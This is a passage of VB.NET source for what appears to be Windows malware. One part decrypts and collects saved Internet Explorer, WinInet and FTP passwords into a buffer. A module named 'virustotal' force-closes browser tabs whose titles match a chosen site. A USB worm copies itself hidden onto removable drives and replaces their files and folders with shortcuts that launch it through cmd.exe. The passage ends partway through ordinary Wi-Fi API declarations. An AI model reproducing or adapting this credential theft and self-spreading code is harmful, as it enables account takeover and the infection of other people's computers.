    Private Declare Function lstrlenA Lib "kernel32.dll" (ByVal lpString As IntPtr) As Integer
    Private Declare Function lstrcpyA Lib "kernel32.dll" (ByVal RetVal As String, ByVal ptr As Integer) As Integer
    Private Const PROV_RSA_FULL As Integer = 1
    Private Const ALG_CLASS_HASH As Integer = (4 * CLng(2 ^ 13))
    Private Const ALG_TYPE_ANY As Integer = 0
    Private Const ALG_SID_SHA As Integer = 4
    Private Const CALG_SHA As Integer = (ALG_CLASS_HASH Or ALG_TYPE_ANY Or ALG_SID_SHA)
    Private Const AT_SIGNATURE As Integer = 2
    Private Declare Function CryptAcquireContext Lib "advapi32.dll" Alias "CryptAcquireContextA" (ByRef phProv As Integer, ByVal pszContainer As Integer, ByVal pszProvider As String, ByVal dwProvType As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptCreateHash Lib "advapi32.dll" (ByVal hProv As Integer, ByVal Algid As Integer, ByVal hKey As Integer, ByVal dwFlags As Integer, ByRef phHash As Integer) As Integer
    Private Declare Function CryptHashData Lib "advapi32.dll" (ByVal hHash As Integer, ByVal pbData As IntPtr, ByVal dwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Const HP_HASHVAL As Integer = &H2S
    Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, ByVal pByte As IntPtr, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, <MarshalAs(UnmanagedType.LPArray)> ByRef pByte() As Byte, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptSignHash Lib "advapi32.dll" Alias "CryptSignHashA" (ByVal hHash As Integer, ByVal dwKeySpec As Integer, ByVal sDescription As Integer, ByVal dwFlags As Integer, ByVal pbSignature As Integer, ByRef pdwSigLen As Integer) As Integer
    Private Declare Function CryptDestroyHash Lib "advapi32.dll" (ByVal hHash As Integer) As Integer
    Private Declare Function CryptReleaseContext Lib "advapi32.dll" (ByVal hProv As Integer, ByVal dwFlags As Integer) As Integer
    Private Const READ_CONTROL As Integer = &H20000
    Private Const STANDARD_RIGHTS_READ As Integer = (READ_CONTROL)
    Private Const KEY_QUERY_VALUE As Integer = &H1S
    Private Const KEY_ENUMERATE_SUB_KEYS As Integer = &H8S
    Private Const KEY_NOTIFY As Integer = &H10S
    Private Const SYNCHRONIZE As Integer = &H100000
    Private Const STANDARD_RIGHTS_WRITE As Integer = (READ_CONTROL)
    Private Const KEY_SET_VALUE As Integer = &H2S
    Private Const KEY_CREATE_SUB_KEY As Integer = &H4S
    Private Const KEY_READ As Integer = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
    Private Const KEY_WRITE As Integer = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
    Private Const HKEY_CURRENT_USER As Integer = &H80000001
    Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Integer, ByVal lpSubKey As String, ByVal ulOptions As Integer, ByVal samDesired As Integer, ByRef phkResult As Integer) As Integer
    Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Integer, ByVal lpValueName As String, ByVal lpReserved As Integer, ByRef lpType As Integer, ByVal lpData As IntPtr, ByRef lpcbData As Integer) As Integer
    Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Integer, ByVal lpValueName As String) As Integer
    Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Integer) As Integer
    Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Integer) As Integer
    Private Structure DATA_BLOB
        Dim cbData As Integer
        Dim pbData As Integer
    End Structure
    Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByVal pOptionalEntropy As IntPtr, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
    Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
    Private Structure StringIndexHeader
        Dim dwWICK As Integer 'semble être une signature de la structure : "WICK"
        Dim dwStructSize As Integer 'taille de la structure d'entête (&h18)
        Dim dwEntriesCount As Integer 'nombre d'entrée suivant le structure
        Dim dwUnkId As Integer 'semble être un identifiant des données
        Dim dwType As Integer 'semble être le type de données :
        Dim dwUnk As Integer 'pourrait être un emplacement dans le structure pour mettre un pointeur vers la première entrée suivant cette structure
    End Structure
    Private Structure StringIndexEntry
        Dim dwDataOffset As Integer 'décalage depuis le début des données StringData
        Dim ftInsertDateTime As FILETIME 'date d'ajout de la donnée dans la liste pour le formulaire ou le champ
        Dim dwDataSize As Integer ' taille de la donnée pour le champ ou le formulaire
    End Structure
    Private Enum CRED_TYPE
        GENERIC = 1
        DOMAIN_PASSWORD
        DOMAIN_CERTIFICATE
        DOMAIN_VISIBLE_PASSWORD
        MAXIMUM
    End Enum
    Private Structure CREDENTIAL_ATTRIBUTE
        Dim lpstrKeyword As Integer
        Dim dwFlags As Integer
        Dim dwValueSize As Integer
        Dim lpbValue As Integer
    End Structure
    Private Structure CREDENTIAL
        Dim dwFlags As Integer
        Dim dwType As Integer
        Dim lpstrTargetName As Integer
        Dim lpstrComment As Integer
        Dim ftLastWritten As FILETIME
        Dim dwCredentialBlobSize As Integer
        Dim lpbCredentialBlob As Integer
        Dim dwPersist As Integer
        Dim dwAttributeCount As Integer
        Dim lpAttributes As Integer 'PCREDENTIAL_ATTRIBUTE
        Dim lpstrTargetAlias As Integer
        Dim lpUserName As Integer
    End Structure
    Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpszFilter As String, ByVal lFlags As Integer, ByRef pCount As Integer, ByRef lppCredentials As Integer) As Integer
    Private Declare Function CredDelete Lib "advapi32.dll" Alias "CredDeleteW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpwstrTargetName As String, ByVal dwType As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As Integer) As Integer
    Private Declare Function SysAllocString Lib "oleaut32.dll" (ByVal pOlechar As Integer) As String
    Private Function GetStrFromPtrA(ByVal lpszA As IntPtr) As String
        Return Marshal.PtrToStringAnsi(lpszA)
    End Function
    Private Function CheckSum(ByRef s As String) As Byte
        Dim i As Integer
        Dim sum As Integer
        sum = 0
        For i = 1 To Len(s) Step 2
            sum = sum + CInt(Val("&H" & Mid(s, i, 2)))
        Next
        CheckSum = CByte(sum Mod 256)
    End Function
    Private Function GetSHA1Hash(ByRef pbData() As Byte) As String
        Dim buff() As Byte
        Dim i As Integer
        ReDim Preserve pbData(pbData.Length + 1)
        buff = System.Security.Cryptography.SHA1.Create().ComputeHash(pbData)
        GetSHA1Hash = ""
        For i = 0 To buff.Length - 1
            GetSHA1Hash = GetSHA1Hash & Right("00" & Hex(buff(i)), 2)
        Next
    End Function
    Private Sub ProcessIEPass(ByVal strURL As String, ByVal strHash As String, ByVal dataOut As DATA_BLOB)
        Dim k As Integer 'index
        Dim ptrData, ptrEntry As IntPtr
        Dim hIndex As StringIndexHeader
        Dim cbhIndex, cbentry As Integer
        Dim eIndex As StringIndexEntry
        Dim strUserName, strPasswd As String
        Dim ptr As IntPtr
        cbentry = Len(eIndex)
        cbhIndex = Len(hIndex)
        ptr = New IntPtr(dataOut.pbData + Marshal.ReadByte(New IntPtr(dataOut.pbData)))
        hIndex = CType(Marshal.PtrToStructure(ptr, hIndex.GetType()), StringIndexHeader)
        If hIndex.dwType = 1 Then 'passwd
            If hIndex.dwEntriesCount >= 2 Then
                ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
                ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
                For i As Integer = 0 To hIndex.dwEntriesCount - 1 Step 2
                    If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
                    eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                    If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                        strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    Else 'ANSI
                        strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    End If
                    ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                    eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                    strPasswd = Space(eIndex.dwDataSize)
                    If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                        strPasswd = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    Else 'ANSI
                        strPasswd = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    End If
                    ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                    OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & vbNewLine

                Next
            End If
        ElseIf hIndex.dwType = 0 Then  'champ
            strPasswd = vbNullString
            ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
            ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
            If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
            For k = 0 To hIndex.dwEntriesCount - 1
                eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                strUserName = Space(eIndex.dwDataSize)
                If lstrlenA(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                    strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                Else 'ANSI
                    strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                End If
                ptrEntry = New IntPtr(ptrEntry.ToInt32() + cbentry)
                OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & vbNewLine

            Next
        End If
    End Sub
    Private Sub AddPasswdInfo(ByVal strRess As String, ByVal hKey As Integer)
        Dim strHash As String
        Dim dwType, ret, cbData As Integer
        Dim dataOut, dataIn, Entropy As DATA_BLOB
        strRess = LCase(strRess)
        strHash = GetSHA1Hash(System.Text.UnicodeEncoding.Unicode.GetBytes(strRess))
        strHash = strHash & Right("00" & Hex(CheckSum(strHash)), 2)
        ret = RegQueryValueEx(hKey, strHash, 0, dwType, IntPtr.Zero, cbData)
        If cbData > 0 Then
            Dim ptrData As IntPtr = Marshal.AllocHGlobal(cbData)
            ret = RegQueryValueEx(hKey, strHash, 0, dwType, ptrData, cbData)
            dataIn.cbData = cbData
            dataIn.pbData = ptrData.ToInt32
            Entropy.cbData = Len(strRess) * 2 + 2
            Entropy.pbData = Marshal.StringToHGlobalUni(strRess).ToInt32
            Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
            ProcessIEPass(strRess, strHash, dataOut)
            Marshal.FreeHGlobal(New IntPtr(Entropy.pbData))
            LocalFree(dataOut.pbData)
        End If
    End Sub
    Protected Function CopyString(ByVal ptr As IntPtr) As String
        Return Marshal.PtrToStringUni(ptr)
    End Function
    Public Sub Refresh()
        Try
            ' OL += vbNewLine & "###IE" & vbNewLine
            Dim i As Integer
            Dim hFile As Integer
            Dim dwSize As Integer
            Dim ptr As IntPtr
            Dim centry As INTERNET_CACHE_ENTRY_INFO
            Dim hKey1 As Integer
            Dim hKey2 As Integer
            Dim url As String
            Dim nameRegex As New System.Text.RegularExpressions.Regex("name=""([^""]+)""", System.Text.RegularExpressions.RegexOptions.Compiled)
            RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage1", 0, KEY_READ, hKey1)
            RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage2", 0, KEY_READ, hKey2)
            If hKey2 <> 0 OrElse hKey1 <> 0 Then
                hFile = FindFirstUrlCacheEntry(vbNullString, IntPtr.Zero, dwSize)
                If dwSize > 0 Then
                    ptr = Marshal.AllocHGlobal(dwSize)
                    Marshal.WriteInt32(ptr, dwSize)
                    hFile = FindFirstUrlCacheEntry(vbNullString, ptr, dwSize)
                    Do
                        centry = CType(Marshal.PtrToStructure(ptr, centry.GetType()), INTERNET_CACHE_ENTRY_INFO)
                        If (centry.CacheEntryType And (NORMAL_CACHE_ENTRY Or URLHISTORY_CACHE_ENTRY)) <> 0 Then
                            url = GetStrFromPtrA(New IntPtr(centry.lpszSourceUrlName))
                            If url.IndexOf("?") >= 0 Then url = url.Substring(0, url.IndexOf("?"))
                            If (InStr(url, "@") > 0) Then url = Mid(url, InStr(url, "@") + 1)
                            If hKey1 <> 0 AndAlso (centry.CacheEntryType And NORMAL_CACHE_ENTRY) = NORMAL_CACHE_ENTRY Then
                                Dim header As String = GetStrFromPtrA(New IntPtr(centry.lpHeaderInfo))
                                If Not String.IsNullOrEmpty(header) AndAlso header.Contains("text/html") Then
                                    Dim localName As String = GetStrFromPtrA(New IntPtr(centry.lpszLocalFileName))
                                    Try
                                        For Each input As System.Text.RegularExpressions.Match In nameRegex.Matches(System.IO.File.ReadAllText(localName))
                                            AddPasswdInfo(input.Groups(1).Value, hKey1)
                                        Next
                                    Catch
                                    End Try
                                End If
                            End If
                            AddPasswdInfo(url, hKey2)
                        End If
                        dwSize = 0
                        Call FindNextUrlCacheEntry(hFile, IntPtr.Zero, dwSize)
                        Marshal.FreeHGlobal(ptr)
                        If dwSize > 0 Then
                            ptr = Marshal.AllocHGlobal(dwSize)
                            Marshal.WriteInt32(ptr, dwSize)
                        End If
                    Loop While FindNextUrlCacheEntry(hFile, ptr, dwSize) <> 0
                    FindCloseUrlCache(hFile)
                End If
                RegCloseKey(hKey1)
                RegCloseKey(hKey2)
            End If
            Dim str_Renamed As String
            Dim dwNbCred, lpCredentials As Integer
            Dim szAuth, strRess As String
            Dim Cred As CREDENTIAL
            Dim dataOut, dataIn, Entropy As DATA_BLOB
            Dim tAuth() As String
            Dim pos As Integer
            str_Renamed = "Microsoft_WinInet_*"
            Call CredEnumerate(str_Renamed, 0, dwNbCred, lpCredentials)
            Dim iBufEntropy(36) As Short
            Dim guid As String
            Dim k As Integer
            If dwNbCred > 0 Then
                For i = 0 To dwNbCred - 1
                    ptr = Marshal.ReadIntPtr(New IntPtr(lpCredentials + i * 4))
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
                    strRess = CopyString(New IntPtr(Cred.lpstrTargetName))
                    Entropy.cbData = 74
                    ptr = Marshal.AllocHGlobal(74)
                    guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7" & vbNullChar
                    For k = 0 To 36
                        Marshal.WriteInt16(ptr, k * 2, CShort(Asc(Mid(guid, k + 1, 1)) * 4))
                    Next
                    Entropy.pbData = ptr.ToInt32()
                    dataIn.pbData = Cred.lpbCredentialBlob
                    dataIn.cbData = Cred.dwCredentialBlobSize
                    dataOut.cbData = 0
                    dataOut.pbData = 0
                    Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    Marshal.FreeHGlobal(ptr)
                    szAuth = Marshal.PtrToStringUni(New IntPtr(dataOut.pbData))
                    tAuth = Split(szAuth, ":")
                    pos = InStr(Mid(strRess, 19), "/")
                    OL += "|URL| " & Mid(strRess, 19, pos - 1) & vbNewLine & "|USR| " & tAuth(0) & vbNewLine & "|PWD| " & tAuth(1) & vbNewLine

                    LocalFree(dataOut.pbData)
                Next
            End If
            CredFree(lpCredentials)
            Dim ftpAccounts As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\FTP\Accounts")
            For Each account As String In ftpAccounts.GetSubKeyNames()
                Dim accountKey As Microsoft.Win32.RegistryKey = ftpAccounts.OpenSubKey(account)
                For Each user As String In accountKey.GetSubKeyNames()
                    Dim userKey As Microsoft.Win32.RegistryKey = accountKey.OpenSubKey(user)
                    Dim pass() As Byte = CType(userKey.GetValue("Password"), Byte())
                    Dim dwEntropy(3) As Byte
                    For j As Integer = 0 To account.Length - 1
                        Dim c As Byte = CByte(AscW(account(j)) And &H1F)
                        dwEntropy(j And 3) = dwEntropy(j And 3) + c
                    Next
                    dataIn.cbData = pass.Length
                    dataIn.pbData = Marshal.AllocHGlobal(pass.Length).ToInt32()
                    Marshal.Copy(pass, 0, New IntPtr(dataIn.pbData), pass.Length)
                    dataOut.cbData = 0
                    dataOut.pbData = 0
                    Dim gc As GCHandle = GCHandle.Alloc(dwEntropy, GCHandleType.Pinned)
                    Entropy.pbData = gc.AddrOfPinnedObject().ToInt32()
                    Entropy.cbData = 4
                    CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    gc.Free()
                    OL += "|URL| " & String.Format("ftp://{0}@{1}/", account, user) & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & Marshal.PtrToStringUni(New IntPtr(dataOut.pbData)) & vbNewLine

                    LocalFree(dataOut.pbData)
                Next
            Next
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region
Module virustotal
    <DllImport("user32.dll", CallingConvention:=CallingConvention.StdCall, CharSet:=CharSet.Unicode, EntryPoint:="keybd_event", ExactSpelling:=True, SetLastError:=True)> _
    Public Function keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Int32, ByVal dwExtraInfo As Int32) As Boolean
    End Function
    <DllImport("PSAPI")> _
    Private Function EmptyWorkingSet(ByVal hProc As IntPtr) As IntPtr
    End Function
    Sub Block(ByVal sSite As String)
        Dim i As New Threading.Thread(AddressOf TS)
        i.Start(sSite)
    End Sub
    Sub TS(ByVal str As String)
        Do
            For Each x As Process In Process.GetProcessesByName("chrome")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("firefox")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("iexplore")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            EmptyWorkingSet(-1)
            Threading.Thread.Sleep(400)
        Loop
    End Sub
End Module
Public Class USB
    Private Off As Boolean = False
    Dim thread As Threading.Thread = Nothing
    Dim r As New Random
    Public ExeName As String = r.Next(199997, 88886777) & ".exe"
    Public Sub Start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub
    Public Sub clean()
        Off = True
        Do Until thread Is Nothing
            Threading.Thread.CurrentThread.Sleep(1)
        Loop
        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or _
                    x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub usb()
        Off = False
        Do Until Off = True
            For Each x In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                        .Removable Or x.DriveType = IO.DriveType.CDRom Then
                            Try
                                If IO.File.Exists(x.Name & ExeName) Then
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                End If
                                IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                For Each xx As String In IO.Directory.GetFiles(x.Name)
                                    If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                    xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                        With CreateObject("WScript.Shell").CreateShortcut _
                                        (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                            .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                            .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                            .Save()
                                        End With
                                    End If
                                Next
                                For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                    IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                    With CreateObject("WScript.Shell") _
                                    .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                         & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                         IO.DirectoryInfo(xx).Name & """ & exit"
                                        .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon :D
                                        .Save()
                                    End With
                                Next
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.CurrentThread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub
    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "")
            If e.Contains(",") = False Then e &= ",0"
            Return e
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Class
Namespace NativeWifi
    Public NotInheritable Class Wlan
        Private Sub New()
        End Sub
#Region "P/Invoke API"
        ''' <summary>
        ''' Defines various opcodes used to set and query parameters for an interface.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_INTF_OPCODE</c> type.
        ''' </remarks>
        Public Enum WlanIntfOpcode
            ''' <summary>
            ''' Opcode used to set or query whether auto config is enabled.
            ''' </summary>
            AutoconfEnabled = 1
            ''' <summary>
            ''' Opcode used to set or query whether background scan is enabled.
            ''' </summary>
            BackgroundScanEnabled
            ''' <summary>
            ''' Opcode used to set or query the media streaming mode of the driver.
            ''' </summary>
            MediaStreamingMode
            ''' <summary>
            ''' Opcode used to set or query the radio state.
            ''' </summary>
            RadioState
            ''' <summary>
            ''' Opcode used to set or query the BSS type of the interface.
            ''' </summary>
            BssType
            ''' <summary>
            ''' Opcode used to query the state of the interface.
            ''' </summary>
            InterfaceState
            ''' <summary>
            ''' Opcode used to query information about the current connection of the interface.
            ''' </summary>
            CurrentConnection
            ''' <summary>
            ''' Opcose used to query the current channel on which the wireless interface is operating.
            ''' </summary>
            ChannelNumber
            ''' <summary>
            ''' Opcode used to query the supported auth/cipher pairs for infrastructure mode.
            ''' </summary>
            SupportedInfrastructureAuthCipherPairs
            ''' <summary>
            ''' Opcode used to query the supported auth/cipher pairs for ad hoc mode.
            ''' </summary>
            SupportedAdhocAuthCipherPairs
            ''' <summary>
            ''' Opcode used to query the list of supported country or region strings.
            ''' </summary>
            SupportedCountryOrRegionStringList
            ''' <summary>
            ''' Opcode used to set or query the current operation mode of the wireless interface.
            ''' </summary>
            CurrentOperationMode
            ''' <summary>
            ''' Opcode used to query driver statistics.
            ''' </summary>
            Statistics = &H10000101
            ''' <summary>
            ''' Opcode used to query the received signal strength.
            ''' </summary>
            RSSI
            SecurityStart = &H20010000
            SecurityEnd = &H2FFFFFFF
            IhvStart = &H30000000
            IhvEnd = &H3FFFFFFF
        End Enum

        ''' <summary>
        ''' Specifies the origin of automatic configuration (auto config) settings.
        ''' </summary>
        ''' <remarks>
        ''' Corresponds to the native <c>WLAN_OPCODE_VALUE_TYPE</c> type.
        ''' </remarks>
        Public Enum WlanOpcodeValueType
            ''' <summary>
            ''' The auto config settings were queried, but the origin of the settings was not determined.
            ''' </summary>
            QueryOnly = 0
            ''' <summary>
            ''' The auto config settings were set by group policy.
            ''' </summary>
            SetByGroupPolicy = 1
            ''' <summary>
            ''' The auto config settings were set by the user.
            ''' </summary>
            SetByUser = 2
            ''' <summary>
            ''' The auto config settings are invalid.
            ''' </summary>
            Invalid = 3
        End Enum

        Public Const WLAN_CLIENT_VERSION_XP_SP2 As UInteger = 1
        Public Const WLAN_CLIENT_VERSION_LONGHORN As UInteger = 2

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanOpenHandle(<[In]()> ByVal clientVersion As UInt32, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef negotiatedVersion As UInt32, <Out()> ByRef clientHandle As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanCloseHandle(<[In]()> ByVal clientHandle As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanEnumInterfaces(<[In]()> ByVal clientHandle As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef ppInterfaceList As IntPtr) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanQueryInterface(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal opCode As WlanIntfOpcode, <[In](), Out()> ByVal pReserved As IntPtr, <Out()> ByRef dataSize As Integer, <Out()> ByRef ppData As IntPtr, _
   <Out()> ByRef wlanOpcodeValueType As WlanOpcodeValueType) As Integer
        End Function

        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanSetInterface(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal opCode As WlanIntfOpcode, <[In]()> ByVal dataSize As UInteger, <[In]()> ByVal pData As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <param name="pDot11Ssid">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        ''' <param name="pIeData">Not supported on Windows XP SP2: must be a <c>null</c> reference.</param>
        <DllImport("wlanapi.dll")> _
        Public Shared Function WlanScan(<[In]()> ByVal clientHandle As IntPtr, <[In](), MarshalAs(UnmanagedType.LPStruct)> ByVal interfaceGuid As Guid, <[In]()> ByVal pDot11Ssid As IntPtr, <[In]()> ByVal pIeData As IntPtr, <[In](), Out()> ByVal pReserved As IntPtr) As Integer
        End Function

        ''' <summary>
        ''' Defines flags passed to <see cref="WlanGetAvailableNetworkList"/>.
        ''' </summary>
        <Flags()> _
        Public Enum WlanGetAvailableNetworkFlags
            ''' <summary>
            ''' Include all ad-hoc network profiles in the available network list, including profiles that are not visible.
            ''' </summary>
            IncludeAllAdhocProfiles = &H1
            ''' <summary>
            ''' Include all hidden network profiles in the available network list, including profiles that are not visible.
            ''' </summary>
            IncludeAllManualHiddenProfiles = &H2
        End Enum

        ''' <summary>
        ''' The header of an array of information about available networks.
        ''' </summary>
        <StructLayout(LayoutKind.Sequential)> _
        Friend Structure WlanAvailableNetworkListHeader
            ''' <summary>
            ''' Contains the number of <see cref=""/> items following the header.
            ''' </summary>
            Public numberOfItems As UInteger
            ''' <summary>
            ''' The index of the current item. The index of the first item is 0.
            ''' </summary>
            Public index As UInteger
        End Structure

        ''' <summary>
